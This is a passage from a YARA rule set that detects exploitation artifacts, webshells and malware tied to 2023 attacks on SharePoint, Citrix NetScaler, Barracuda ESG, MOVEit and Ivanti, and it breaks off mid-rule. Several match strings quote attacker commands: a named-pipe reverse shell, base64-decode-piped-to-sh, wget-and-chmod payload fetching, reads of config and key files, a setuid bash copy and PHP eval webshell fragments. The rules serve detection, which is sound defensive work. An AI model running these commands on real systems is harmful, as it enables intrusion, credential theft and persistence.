\"https://github.com/Chocapikk/CVE-2023-29357\"\n      date = \"2023-10-01 17:10:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-10-01\"\n      tags = \"CVE_2023_29357, DEMO, EXPLOIT, HKTL, SCRIPT, T1059_006\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')\" \n   condition: \n      filesize < 30KB and $x1\n}\n\nrule HKTL_EXPL_POC_NET_SharePoint_CVE_2023_29357_Sep23_1_RID3707 : CVE_2023_29357 DEMO EXE EXPLOIT FILE HKTL {\n   meta:\n      description = \"Detects a C# POC to exploit CVE-2023-29357 on Microsoft SharePoint servers\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/LuemmelSec/CVE-2023-29357\"\n      date = \"2023-10-01 17:21:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2023_29357, DEMO, EXE, EXPLOIT, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"{f22d2de0-606b-4d16-98d5-421f3f1ba8bc}\" ascii wide\n      $x2 = \"{F22D2DE0-606B-4D16-98D5-421F3F1BA8BC}\" ascii wide\n      $s1 = \"Bearer\" \n      $s2 = \"hashedprooftoken\" \n      $s3 = \"/_api/web/\" \n      $s4 = \"X-PROOF_TOKEN\" \n      $s5 = \"00000003-0000-0ff1-ce00-000000000000\" \n      $s6 = \"IsSiteAdmin\" \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and ( 1 of ( $x* ) or all of ( $s* ) )\n}\n\nrule LOG_EXPL_SharePoint_CVE_2023_29357_Sep23_1_RID342F : CVE_2023_29357 DEMO EXPLOIT LOG {\n   meta:\n      description = \"Detects log entries that could indicate a successful exploitation of CVE-2023-29357 on Microsoft SharePoint servers\"\n      author = \"Florian Roth (with help from @LuemmelSec)\"\n      reference = \"https://twitter.com/Gi7w0rm/status/1706764212704591953?s=20\"\n      date = \"2023-09-28 15:19:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-10-01\"\n      tags = \"CVE_2023_29357, DEMO, EXPLOIT, LOG\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $xr1 = /GET [a-z\\.\\/_]{0,40}\\/web\\/(siteusers|currentuser) - (80|443) .{10,200} (python-requests\\/[0-9\\.]{3,8}|-) [^ ]{1,160} [^4]0[0-9] / \n   condition: \n      $xr1\n}\n\nrule SUSP_QakBot_Uninstaller_FBI_Aug23_RID32FE : DEMO QAKBOT SUSP {\n   meta:\n      description = \"Detects Qakbot uninstaller used by the FBI / Dutch Police\"\n      author = \"Florian Roth\"\n      reference = \"https://www.justice.gov/usao-cdca/divisions/national-security-division/qakbot-resources\"\n      date = \"2023-08-31 14:28:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"559cae635f0d870652b9482ef436b31d4bb1a5a0f51750836f328d749291d0b6\"\n      hash2 = \"855eb5481f77dde5ad8fa6e9d953d4aebc280dddf9461144b16ed62817cc5071\"\n      hash3 = \"fab408536aa37c4abc8be97ab9c1f86cb33b63923d423fdc2859eb9d63fa8ea0\"\n      tags = \"DEMO, QAKBOT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 69 c1 65 89 07 6c 03 c2 89 84 95 24 f6 ff ff 8b 55 e4 42 89 55 e4 81 fa 70 02 00 00 7c d4 } \n      $op2 = { 42 89 55 e4 81 fa 70 02 00 00 7c d4 f2 0f 10 0d a0 31 00 10 33 f6 f2 0f 10 15 a8 31 00 10 66 90 } \n      $op5 = { 68 48 31 00 10 6a 28 57 e8 e4 fd ff ff 8b 4d fc 83 c4 4c 33 cd 33 c0 } \n      $op6 = { 33 c0 66 39 06 74 0f 0f 1f 80 00 00 00 00 40 66 83 3c 46 00 75 f8 8d 3c 00 } \n   condition: \n      all of them\n}\n\nrule SUSP_Qakbot_Uninstaller_File_Aug23_RID33CD : DEMO METARULE QAKBOT SUSP {\n   meta:\n      description = \"Detects Qakbot Uninstaller files used by the FBI and Dutch National Police in a disruption operation against the Qakbot in August 2023\"\n      author = \"Florian Roth\"\n      reference = \"https://www.justice.gov/usao-cdca/divisions/national-security-division/qakbot-resources\"\n      date = \"2023-08-30 15:03:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, METARULE, QAKBOT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $xc1 = { E8 00 00 00 00 58 55 89 E5 89 C2 68 03 00 00 00\n               68 00 2C 00 00 05 20 0A 00 00 50 E8 05 00 00 00\n               83 C4 04 C9 C3 81 EC 08 01 00 00 53 55 56 57 6A\n               6B 58 6A 65 5B 6A 72 66 89 84 24 D4 00 00 00 33 } \n   condition: \n      $xc1\n}\n\nrule SUSP_ESXiArgs_Endpoint_Conf_Aug23_RID3307 : DEMO SUSP {\n   meta:\n      description = \"Detects indicators found in endpoint.conf files as modified by actors in the ESXiArgs campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://www.bleepingcomputer.com/forums/t/782193/esxi-ransomware-help-and-support-topic-esxiargs-args-extension/page-47\"\n      date = \"2023-08-04 14:30:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"/client/clients.xml\" ascii\n      $a2 = \"/var/run/vmware/proxy-sdk-tunnel\" ascii fullword\n      $a3 = \"redirect\" ascii fullword\n      $a4 = \"allow\" ascii fullword\n      $s1 = \" local 8008 allow allow\" \n   condition: \n      filesize < 2KB and all of them\n}\n\nrule MAL_WAR_Ivanti_EPMM_MobileIron_Mi_War_Aug23_RID365A : CVE_2023_35078 DEMO FILE MAL {\n   meta:\n      description = \"Detects WAR file found in the Ivanti EPMM / MobileIron Core compromises exploiting CVE-2023-35078\"\n      author = \"Florian Roth\"\n      reference = \"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-213a\"\n      date = \"2023-08-01 16:52:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6255c75e2e52d779da39367e7a7d4b8d1b3c9c61321361952dcc05819251a127\"\n      tags = \"CVE_2023_35078, DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"logsPaths.txt\" ascii fullword\n      $s2 = \"keywords.txtFirefox\" ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and filesize < 20KB and all of them\n}\n\nrule MAL_WAR_Ivanti_EPMM_MobileIron_LogClear_JAVA_Aug23_RID38A5 : CVE_2023_35078 DEMO MAL {\n   meta:\n      description = \"Detects LogClear.class found in the Ivanti EPMM / MobileIron Core compromises exploiting CVE-2023-35078\"\n      author = \"Florian Roth\"\n      reference = \"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-213a\"\n      date = \"2023-08-01 18:30:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"deb381c25d7a511b9eb936129eeba2c0341cff7f4bd2168b05e40ab2ee89225e\"\n      tags = \"CVE_2023_35078, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"logsPaths.txt\" ascii fullword\n      $s2 = \"log file: %s, not read\" ascii fullword\n      $s3 = \"/tmp/.time.tmp\" ascii fullword\n      $s4 = \"readKeywords\" ascii fullword\n      $s5 = \"\\\"----------------  ----------------\" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0xfeca and filesize < 20KB and 4 of them or all of them\n}\n\nrule LOG_EXPL_Citrix_Netscaler_ADC_Exploitation_Attempt_CVE_2023_3519_Jul23_1_RID4034 : CVE_2023_3519 DEMO EXPLOIT LOG {\n   meta:\n      description = \"This YARA rule detects forensic artifacts that appear following an attempted exploitation of Citrix NetScaler ADC CVE-2023-3519. The rule identifies an attempt to access the vulnerable function using an overly long URL, a potential sign of attempted exploitation. However, it does not confirm whether such an attempt was successful.\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.assetnote.io/2023/07/24/citrix-rce-part-2-cve-2023-3519/\"\n      date = \"2023-07-27 23:52:31\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2023_3519, DEMO, EXPLOIT, LOG\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $sr1 = /GWTEST FORMS SSO: Parse=0; URLLEN=([2-9][0-9]{2}|[0-9]{4,20}); Event: start=0x/ \n      $s1 = \", type=1; Target: start=0x\" \n   condition: \n      all of them\n}\n\nrule LOG_EXPL_Ivanti_EPMM_MobileIron_Core_CVE_2023_35078_Jul23_1_RID3A62 : CVE_2023_35078 DEMO EXPLOIT LOG {\n   meta:\n      description = \"Detects the successful exploitation of Ivanti Endpoint Manager Mobile (EPMM) / MobileIron Core CVE-2023-35078\"\n      author = \"Florian Roth\"\n      reference = \"Ivanti Endpoint Manager Mobile (EPMM) CVE-2023-35078 - Analysis Guidance\"\n      date = \"2023-07-25 19:44:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2023_35078, DEMO, EXPLOIT, LOG\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $xr1 = /\\/mifs\\/aad\\/api\\/v2\\/[^\\n]{1,300} 200 [1-9][0-9]{0,60} / \n   condition: \n      $xr1\n}\n\nrule EXPL_Citrix_Netscaler_ADC_ForensicArtifacts_CVE_2023_3519_Jul23_3_RID3D91 : CVE_2023_3519 DEMO EXPLOIT {\n   meta:\n      description = \"Detects forensic artifacts found after an exploitation of Citrix NetScaler ADC CVE-2023-3519\"\n      author = \"Florian Roth\"\n      reference = \"https://www.mandiant.com/resources/blog/citrix-zero-day-espionage\"\n      date = \"2023-07-24 22:00:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2023_3519, DEMO, EXPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"cat /flash/nsconfig/ns.conf >>\" ascii\n      $x2 = \"cat /nsconfig/.F1.key >>\" ascii\n      $x3 = \"openssl base64 -d < /tmp/\" ascii\n      $x4 = \"cp /usr/bin/bash /var/tmp/bash\" ascii\n      $x5 = \"chmod 4775 /var/tmp/bash\" \n      $x6 = \"pwd;pwd;pwd;pwd;pwd;\" \n      $x7 = \"(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))\" \n   condition: \n      filesize < 10MB and 1 of them\n}\n\nrule WEBSHELL_SECRETSAUCE_Jul23_1_RID2F7C : CVE_2023_3519 DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects SECRETSAUCE PHP webshells (found after an exploitation of Citrix NetScaler ADC CVE-2023-3519)\"\n      author = \"Florian Roth\"\n      reference = \"https://www.mandiant.com/resources/blog/citrix-zero-day-espionage\"\n      date = \"2023-07-24 11:59:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2023_3519, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sa1 = \"for ($x=0; $x<=1; $x++) {\" ascii\n      $sa2 = \"$_REQUEST[\" ascii\n      $sa3 = \"@eval\" ascii\n      $sb1 = \"public $cmd;\" ascii\n      $sb2 = \"return @eval($a);\" ascii\n      $sb3 = \"$z->run($z->get('openssl_public_decrypt'));\" \n   condition: \n      filesize < 100KB and ( all of ( $sa* ) or 2 of ( $sb* ) )\n}\n\nrule EXPL_Citrix_Netscaler_ADC_ForensicArtifacts_CVE_2023_3519_Jul23_2_RID3D90 : CVE_2023_3519 DEMO EXPLOIT {\n   meta:\n      description = \"Detects forensic artifacts found after an exploitation of Citrix NetScaler ADC CVE-2023-3519\"\n      author = \"Florian Roth\"\n      reference = \"https://www.cisa.gov/sites/default/files/2023-07/aa23-201a_csa_threat_actors_exploiting_citrix-cve-2023-3519_to_implant_webshells.pdf\"\n      date = \"2023-07-21 21:59:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2023_3519, DEMO, EXPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"tar -czvf - /var/tmp/all.txt\" ascii fullword\n      $s2 = \"-out /var/tmp/test.tar.gz\" ascii\n      $s3 = \"/test.tar.gz /netscaler/\" \n   condition: \n      filesize < 10MB and 1 of them\n}\n\nrule APT_Equation_Group_Op_Triangulation_TriangleDB_Implant_Jun23_1_RID3EB5 : APT DEMO G0020 MACOS {\n   meta:\n      description = \"Detects TriangleDB implant found being used in Operation Triangulation on iOS devices (maybe also used on macOS systems)\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/triangledb-triangulation-implant/110050/\"\n      date = \"2023-06-21 22:48:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, G0020, MACOS\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"unmungeHexString\" ascii fullword\n      $s2 = \"CRPwrInfo\" ascii fullword\n      $s3 = \"CRConfig\" ascii fullword\n      $s4 = \"CRXConfigureDBServer\" ascii fullword\n   condition: \n      ( uint16 ( 0 ) == 0xfacf and filesize < 30MB and $s1 and 2 of them ) or all of them\n}\n\nrule APT_MAL_UNC4841_SEASPY_Jun23_1_RID2FFA : APT CVE_2023_2868 DEMO MAL {\n   meta:\n      description = \"Detects SEASPY malware used by UNC4841 in attacks against Barracuda ESG appliances exploiting CVE-2023-2868\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.talosintelligence.com/alchimist-offensive-framework/\"\n      date = \"2023-06-16 12:20:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3f26a13f023ad0dcd7f2aa4e7771bba74910ee227b4b36ff72edc5f07336f115\"\n      tags = \"APT, CVE_2023_2868, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sx1 = \"usage: ./BarracudaMailService <Network-Interface>. e.g.: ./BarracudaMailService eth0\" ascii fullword\n      $s1 = \"fcntl.tmp.amd64.\" ascii\n      $s2 = \"Child process id:%d\" ascii fullword\n      $s3 = \"[*]Success!\" ascii fullword\n      $s4 = \"NO port code\" ascii\n      $s5 = \"enter open tty shell\" ascii\n      $op1 = { 48 89 c6 f3 a6 0f 84 f7 01 00 00 bf 6c 84 5f 00 b9 05 00 00 00 48 89 c6 f3 a6 0f 84 6a 01 00 00 } \n      $op2 = { f3 a6 0f 84 d2 00 00 00 48 89 de bf 51 5e 61 00 b9 05 00 00 00 f3 a6 74 21 48 89 de } \n      $op3 = { 72 de 45 89 f4 e9 b8 f4 ff ff 48 8b 73 08 45 85 e4 ba 49 3d 62 00 b8 44 81 62 00 48 0f 45 d0 } \n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 9000KB and 3 of them or 5 of them\n}\n\nrule APT_MAL_UNC4841_SEASPY_LUA_Jun23_1_RID313B : APT DEMO MAL SCRIPT {\n   meta:\n      description = \"Detects SEASPY malware related LUA script\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.talosintelligence.com/alchimist-offensive-framework/\"\n      date = \"2023-06-16 13:13:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"56e8066bf83ff6fe0cec92aede90f6722260e0a3f169fc163ed88589bffd7451\"\n      tags = \"APT, DEMO, MAL, SCRIPT\"\n      minimum_yara = \"4.0.0\"\n      \n   strings:\n      $x1 = \"os.execute('rverify'..' /tmp/'..attachment:filename())\" ascii fullword\n      $x2 = \"log.debug(\\\"--- opening archive [%s], mimetype [%s]\\\", tmpfile\" ascii fullword\n      $xe1 = \"os.execute('rverify'..' /tmp/'..attachment:filename())\" ascii base64\n      $xe2 = \"log.debug(\\\"--- opening archive [%s], mimetype [%s]\\\", tmpfile\" ascii base64\n   condition: \n      filesize < 500KB and 1 of them\n}\n\nrule MAL_Compromised_Cert_DuckTail_Stealer_Jun23_RID3749 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects binaries signed with certificates used by DuckTail stealer\"\n      author = \"dr4k0nia\"\n      reference = \"Internal Research\"\n      date = \"2023-06-16 17:32:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-08-15\"\n      hash1 = \"17c75f2d14af9f00822fc1dba00ccc9ec71fc50962e196d7e6f193f4b2ee0183\"\n      hash2 = \"b3cfdb442772d07a7f037b0bb093ba315dfd1e79b0e292736c52097355495270\"\n      hash3 = \"9afe013cae0167993a6a7ccd650eb1221a5ec163110565eb3a49a8b57949d4ee\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sx1 = \"AZM MARKETING COMPANY LIMITED\" ascii fullword\n      $sx2 = \"CONG TY TNHH\" ascii\n      $sx3 = {43 C3 94 4E 47 20 54 59 20 54 4E 48 48 20} \n      $sx4 = \"CONG TY TRACH\" ascii\n      $se1 = {65 78 BE 85 2D 48 E3 3D 4E 48 B8 D4 73 F5 B7 60} \n      $se2 = {1D 53 38 32 74 2B 58 37 87 C0 A2 53 32 F7 FB 06} \n      $se3 = {00 BD 7B 85 B2 6A 69 C9 7D 6D 68 CC 95 67 34 C0 6B} \n      $se4 = {06 5F 5C 57 0B D6 A7 98 92 FB B0 E6 34 61 3A 4D} \n      $se5 = {41 55 3F 07 13 37 11 7A 99 B4 58 57} \n      $se6 = {1E AA E4 CE E7 EE 89 FB 20 32 59 27 88 13 D8 53} \n      $se7 = {56 DC DB 85 D4 89 F9 87 B2 D6 76 72} \n      $se8 = {2D A4 50 57 C2 74 3C 1A 3C A4 93 7A} \n      $se9 = {37 AE 95 F5 4C 8E 9B D0 B6 47 68 6A} \n      $se10 = {3D C8 F5 3B 62 7A 34 07 AC 7E 01 00 13 87 A3 B3} \n      $se11 = {01 C9 87 5A 5F A8 59 68 6D 34 17 C9} \n      $se12 = {1B 35 19 E1 CD C2 6B 57 DA EE 06 C9} \n      $se13 = {79 7D 0B 5E 22 AA 0F C7 A2 97 E6 48} \n      $se14 = {57 9E 5C 89 B0 85 A7 96 B3 3C F3 19} \n   condition: \n      uint16 ( 0 ) == 0x5a4d and 1 of ( $sx* ) and 1 of ( $se* )\n}\n\nrule APT_UNC4841_ESG_Barracuda_CVE_2023_2868_Forensic_Artifacts_Jun23_1_RID3CE1 : APT CVE_2023_2868 DEMO SCRIPT T1105 {\n   meta:\n      description = \"Detects forensic artifacts found in the exploitation of CVE-2023-2868 in Barracuda ESG devices by UNC4841\"\n      author = \"Florian Roth\"\n      reference = \"https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally\"\n      date = \"2023-06-15 21:30:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-06-16\"\n      tags = \"APT, CVE_2023_2868, DEMO, SCRIPT, T1105\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x01 = \"=;ee=ba;G=s;_ech_o $abcdefg_${ee}se64\" ascii\n      $x02 = \";echo $abcdefg | base64 -d | sh\" ascii\n      $x03 = \"setsid sh -c \\\"mkfifo /tmp/p\" ascii\n      $x04 = \"sh -i </tmp/p 2>&1\" ascii\n      $x05 = \"if string.match(hdr:body(), \\\"^[%w%+/=\" ascii\n      $x06 = \"setsid sh -c \\\"/sbin/BarracudaMailService eth0\\\"\" \n      $x07 = \"echo \\\"set the bvp ok\\\"\" \n      $x08 = \"find ${path} -type f ! -name $excludeFileNameKeyword | while read line ;\" \n      $x09 = \" /mail/mstore | xargs -i cp {} /usr/share/.uc/\" \n      $x10 = \"tar -T /mail/mstore/tmplist -czvf \" \n      $sa1 = \"sh -c wget --no-check-certificate http\" \n      $sa2 = \".tar;chmod +x \" \n   condition: \n      1 of ( $x* ) or all of ( $sa* )\n}\n\nrule SUSP_FScan_Port_Scanner_Output_Jun23_RID3494 : DEMO SCRIPT SUSP T1046 {\n   meta:\n      description = \"Detects output generated by the command line port scanner FScan\"\n      author = \"Florian Roth\"\n      reference = \"https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally\"\n      date = \"2023-06-15 15:36:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, SUSP, T1046\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[*] NetInfo:\" ascii\n      $s2 = \":443 open\" ascii\n      $s3 = \"   [->]\" \n   condition: \n      filesize < 800KB and all of them\n}\n\nrule LOG_EXPL_MOVEit_Exploitation_Indicator_Jun23_3_RID37DC : DEMO EXPLOIT LOG {\n   meta:\n      description = \"Detects a potential compromise indicator found in MOVEit DMZ Web API logs\"\n      author = \"Nasreddine Bencherchali\"\n      reference = \"https://attackerkb.com/topics/mXmV0YpC3W/cve-2023-34362/rapid7-analysis\"\n      date = \"2023-06-13 17:56:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXPLOIT, LOG\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"TargetInvocationException\" ascii\n      $s2 = \"MOVEit.DMZ.Application.Folders.ResumableUploadFilePartHandler.DeserializeFileUploadStream\" ascii\n   condition: \n      all of ( $s* )\n}\n\nrule HKTL_EXPL_POC_LibSSH_Auth_Bypass_CVE_2023_2283_Jun23_1_RID3855 : CVE_2023_2283 DEMO EXPLOIT FILE HKTL {\n   meta:\n      description = \"Detects POC code used in attacks against libssh vulnerability CVE-2023-2283\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/github/securitylab/tree/1786eaae7f90d87ce633c46bbaa0691d2f9bf449/SecurityExploits/libssh/pubkey-auth-bypass-CVE-2023-2283\"\n      date = \"2023-06-08 18:16:41\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2023_2283, DEMO, EXPLOIT, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"nprocs = %d\" ascii fullword\n      $s2 = \"fork failed: %s\" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0x457f and all of them\n}\n\nrule MAL_ELF_ReverseShell_SSLShell_Jun23_1_RID341E : CVE_2023_2868 DEMO FILE LINUX MAL SCRIPT {\n   meta:\n      description = \"Detects a reverse shell named SSLShell used in Barracuda ESG exploitation (CVE-2023-2868)\"\n      author = \"Florian Roth\"\n      reference = \"https://www.barracuda.com/company/legal/esg-vulnerability\"\n      date = \"2023-06-07 15:16:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8849a3273e0362c45b4928375d196714224ec22cb1d2df5d029bf57349860347\"\n      tags = \"CVE_2023_2868, DEMO, FILE, LINUX, MAL, SCRIPT\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $sc1 = { 00 2D 63 00 2F 62 69 6E 2F 73 68 00 } \n      $s1 = \"SSLShell\" \n   condition: \n      uint32be ( 0 ) == 0x7f454c46 and uint16 ( 0x10 ) == 0x0002 and filesize < 5MB and all of them\n}\n\nrule MAL_ELF_SALTWATER_Jun23_1_RID2EB8 : CVE_2023_2868 DEMO LINUX MAL {\n   meta:\n      description = \"Detects SALTWATER malware used in Barracuda ESG exploitations (CVE-2023-2868)\"\n      author = \"Florian Roth\"\n      reference = \"https://www.barracuda.com/company/legal/esg-vulnerability\"\n      date = \"2023-06-07 11:26:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"601f44cc102ae5a113c0b5fe5d18350db8a24d780c0ff289880cc45de28e2b80\"\n      tags = \"CVE_2023_2868, DEMO, LINUX, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"libbindshell.so\" \n      $s1 = \"ShellChannel\" \n      $s2 = \"MyWriteAll\" \n      $s3 = \"CheckRemoteIp\" \n      $s4 = \"run_cmd\" \n      $s5 = \"DownloadByProxyChannel\" \n      $s6 = \"[-] error: popen failed\" \n      $s7 = \"/home/product/code/config/ssl_engine_cert.pem\" \n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 6000KB and ( ( 1 of ( $x* ) and 2 of them ) or 3 of them ) or all of them\n}\n\nrule SUSP_Fake_AMSI_DLL_Jun23_1_RID2F77 : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects an amsi.dll that has the same exports as the legitimate one but very different contents or file sizes\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/eversinc33/status/1666121784192581633?s=20\"\n      date = \"2023-06-07 11:58:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-06-12\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $a1 = \"Microsoft.Antimalware.Scan.Interface\" ascii\n      $a2 = \"Amsi.pdb\" ascii fullword\n      $a3 = \"api-ms-win-core-sysinfo-\" ascii\n      $a4 = \"Software\\\\Microsoft\\\\AMSI\\\\Providers\" wide\n      $a5 = \"AmsiAntimalware@\" ascii\n      $a6 = \"AMSI UAC Scan\" ascii\n      $fp1 = \"Wine builtin DLL\" \n   condition: \n      uint16 ( 0 ) == 0x5a4d and ( pe.exports ( \"AmsiInitialize\" ) and pe.exports ( \"AmsiScanString\" ) ) and ( filesize > 200KB or filesize < 35KB or not 4 of ( $a* ) ) and not 1 of ( $fp* )\n}\n\nrule LOG_EXPL_MOVEit_Exploitation_Indicator_Jun23_2_RID37DB : DEMO EXPLOIT LOG {\n   meta:\n      description = \"Detects a potential compromise indicator found in MOVEit Transfer logs\"\n      author = \"Florian Roth\"\n      reference = \"https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response\"\n      date = \"2023-06-03 17:56:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXPLOIT, LOG\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.5195.102+Safari/537.36\" ascii\n      $a2 = \"Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.5195.54+Safari/537.36\" ascii\n      $s1 = \" POST /moveitisapi/moveitisapi.dll\" ascii\n      $s2 = \" POST /guestaccess.aspx\" \n      $s3 = \" POST /api/v1/folders/\" \n      $s4 = \"/files uploadType=resumable&\" \n      $s5 = \" action=m2 \" \n   condition: \n      1 of ( $a* ) and 3 of ( $s* ) or all of ( $s* )\n}\n\nrule WEBSHELL_ASPX_DLL_MOVEit_Jun23_1_RID3131 : DEMO EXE T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects compiled ASPX web shells found being used in MOVEit Transfer exploitation\"\n      author = \"Florian Roth\"\n      reference = \"https://www.trustedsec.com/blog/critical-vulnerability-in-progress-moveit-transfer-technical-analysis-and-recommendations/?utm_content=251159938&utm_medium=social&utm_source=twitter&hss_channel=tw-403811306\"\n      date = \"2023-06-01 13:12:01\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6cbf38f5f27e6a3eaf32e2ac73ed02898cbb5961566bb445e3c511906e2da1fa\"\n      tags = \"DEMO, EXE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"human2_aspx\" ascii fullword\n      $x2 = \"X-siLock-Comment\" wide\n      $x3 = \"x-siLock-Step1\" wide\n      $a1 = \"MOVEit.DMZ.Core.Data\" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and ( 1 of ( $x* ) and $a1 ) or all of them\n}\n\nrule WEBSHELL_ASPX_MOVEit_Jun23_1_RID2FF6 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects ASPX web shells as being used in MOVEit Transfer exploitation\"\n      author = \"Florian Roth\"\n      reference = 